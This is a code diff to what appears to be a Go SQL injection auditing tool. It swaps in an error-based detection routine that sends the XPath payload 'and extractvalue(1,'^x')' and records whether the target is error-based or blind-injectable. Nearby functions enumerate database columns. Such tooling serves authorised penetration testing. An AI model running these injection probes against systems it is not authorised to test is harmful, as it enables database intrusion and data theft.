@@ -3,6 +3,7 @@ package sql
 import (
 	"auditor/entities"
 	based "auditor/handlers/sql/base"
+	errorBased "auditor/handlers/sql/base/error"
 	"auditor/payloads/intruder/detect"
 	"fmt"
 	"regexp"
@@ -33,19 +34,18 @@ func generatePwnQuery(query string) string {
 }
 
 func validatePwnType() based.SQLi {
-	html := based.UnionBasedvalidate(options, "+and+extractvalue(1,'^x')")
-	r := regexp.MustCompile(based.ErrXPathForm)
+	html := errorBased.ErrorBasedvalidate(options, "+and+extractvalue(1,'^x')")
+	r := regexp.MustCompile(errorBased.ErrXPathForm)
 	anyXPATH := r.FindString(html)
 	log.Println("XPATH's result: ", anyXPATH)
 	if anyXPATH != "" {
-		return based.UnionSQLiBased
+		options.InjectionBase = "ErrorSQLiBased"
+		return based.ErrorSQLiBased
 	}
 
 	if validateByMethod("'", based.LengthValidation) == 0 {
+		options.InjectionBase = "BlindSQLiBased"
 		return based.LengthValidation
-	}
-	if validateByMethod("'", based.ErrorSQLiBased) == 0 {
-		return based.ErrorSQLiBased
 	}
 
 	return based.UnkownBased
@@ -222,7 +222,6 @@ func fetchDBColumnLen(method based.SQLi, tableName string) int {
 }
 
 func (s *Service) fetchColumnsName(method based.SQLi, tableName string) {
-
 	if options.ValidateProc(entities.ColumnsName) {
 		return
 	}
